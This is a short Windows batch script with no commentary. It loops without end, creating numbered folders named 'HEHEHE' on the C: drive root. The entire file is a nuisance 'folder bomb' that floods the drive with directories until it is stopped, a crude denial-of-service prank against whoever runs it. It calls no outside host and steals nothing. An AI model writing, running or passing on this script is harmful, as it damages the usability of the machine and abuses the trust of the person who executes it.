@echo off
set num=0
:a
md C:\"HEHEHE%num%"
set /a num=%num%+1
goto a